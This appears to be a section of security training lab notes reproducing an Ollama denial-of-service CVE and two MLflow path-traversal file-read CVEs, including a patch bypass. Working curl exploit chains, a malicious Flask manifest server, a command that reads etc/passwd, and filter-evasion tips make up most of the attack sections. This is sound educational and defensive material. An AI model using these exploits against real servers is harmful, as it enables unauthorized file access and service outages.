# Section 8: Vulnerable Framework Code

**Theme:** ML tooling (Ollama, MLflow, TorchServe, etc.) is regular software with regular bugs. **Supply-chain vulnerabilities in these frameworks put the whole deployment at risk even when your own code is clean.** The bug isn't in the ML logic - it's in a bundled third-party component, which is why an engagement typically scopes this as **understand-and-report, not an exploitation target**.

---

## CVE-2025-1975: Ollama DoS

Ollama (local LLM runner) crashes when pulling a model whose manifest is malformed. The vulnerable version (0.5.11) **does not validate an expected array/field size before indexing into it**, so a short-circuited manifest causes an out-of-bounds slice access and panics the server.

Run the vulnerable version:

```bash
./ollama serve
```

Host a malicious manifest with a minimal Flask server (`server.py`):

```python
from flask import Flask

app = Flask(__name__)

@app.route("/v2/dos/model/manifests/latest")
def exploit():
    return {"layers": [{}]}

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

```bash
python3 server.py
```

**The payload is just an empty `layers` entry** - missing the `digest`/`size` fields Ollama expects. The download code goes to strip/validate the `sha256:` digest string, but the field is absent, so it slices into an empty string.

Trigger it via Ollama's own pull API, pointing at the malicious server (Ollama's API runs on 11434 by default):

```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"model": "http://localhost:5000/dos/model", "insecure": true}' \
  http://localhost:11434/api/pull
```

Result: curl errors out (`transfer closed with outstanding read data remaining`) and Ollama panics server-side:

```
panic: runtime error: slice bounds out of range [:19] with length 0
```

**Mechanism: malformed remote data crashing a parser that trusted the shape of its input.** No auth, no RCE - one crafted manifest and the service is down.

---

## CVE-2023-6909 and CVE-2024-1594: MLflow LFI (and the bypass)

**Vocabulary:** an MLflow **run** is one execution of code; an **experiment** groups related runs.
![Vulnerable Framework Code](/assets/8%20Vulnerable%20Framework%20Code-20261002021702352.png)
### CVE-2023-6909: LFI via query string

MLflow **converts a remote URL parameter into a local file path without stripping `..`**, so a crafted URL path-traverses out of the intended directory.

```bash
pip3 install mlflow==2.7.1
mlflow server --host 127.0.0.1 --port 8080
```

**Four-step chain to read arbitrary files:**

1. Create an experiment with a traversal payload in `artifact_location` (**payload sits in the query string, after the `?`**):

```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"name": "pwn", "artifact_location": "http:///?/../../../../../../../../../"}' \
  'http://127.0.0.1:8080/ajax-api/2.0/mlflow/experiments/create'
```

Returns an `experiment_id`.

2. Create a run under that experiment, capture the `run_id`:

```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"experiment_id": "563025420075628626"}' \
  'http://127.0.0.1:8080/api/2.0/mlflow/runs/create'
```

3. Register a model:

```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"name": "pwn_model"}' \
  'http://127.0.0.1:8080/ajax-api/2.0/mlflow/registered-models/create'
```

4. Link the model to the run, with `source` pointing at the filesystem root:

```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"name": "pwn_model", "run_id": "bf08b6635cb1427e9893744347fb9604", "source": "file:///"}' \
  'http://127.0.0.1:8080/ajax-api/2.0/mlflow/model-versions/create'
```

Now read any file by relative path from root:

```bash
curl 'http://127.0.0.1:8080/model-versions/get-artifact?path=etc/passwd&name=pwn_model&version=1'
```

**The traversal payload planted the escape route in step 1; everything after it just walks the API's normal model-versioning flow until the final artifact-download endpoint serves whatever file you ask for.** Fixed upstream by explicitly rejecting `..` in the query string.

### CVE-2024-1594: the incomplete-fix bypass

The patch only checked the query string. **Put the same traversal in a URL fragment (after `#`) instead of the query string (after `?`), and the check never sees it.**

```bash
pip3 install mlflow==2.9.2
mlflow server --host 127.0.0.1 --port 8080
```

Same payload via query string now gets rejected:

```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"name": "pwn2", "artifact_location": "http:///?/../../../../../../../../../"}' \
  'http://127.0.0.1:8080/ajax-api/2.0/mlflow/experiments/create'
# -> {"error_code": "INVALID_PARAMETER_VALUE", "message": "Invalid query string"}
```

Swap `?` for `#`, and append a target directory:

```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"name": "pwn2", "artifact_location": "http:///#../../../../../../../../../etc/"}' \
  'http://127.0.0.1:8080/ajax-api/2.0/mlflow/experiments/create'
# -> succeeds; rest of the four-step chain is identical
```

---

## Takeaways

- **A security fix that validates one input channel (query string) but not an equivalent one (URL fragment) is a classic incomplete-fix pattern.** If a filter blocks `?param=..`, try fragments, headers, body params, double/alternate encodings, or a different parameter carrying the same data to the same sink.
- **LFI exploitation via a multi-step API chain (create experiment -> create run -> register model -> link model with `file://` source -> fetch artifact) is a reusable template for any ML platform with similar artifact/versioning APIs**, not just MLflow. Only step 1 is malicious; the rest is the product behaving as designed.
- **CWE mapping for the report:**
    - CVE-2025-1975 -> **CWE-129** (improper validation of array index) -> **DoS**
    - CVE-2023-6909 / CVE-2024-1594 -> **CWE-22** (path traversal) -> **LFI**
- **Remediation:** patch to current versions, validate all input channels consistently (query, fragment, headers, body), and run framework dependency / SCA scanning as part of CI.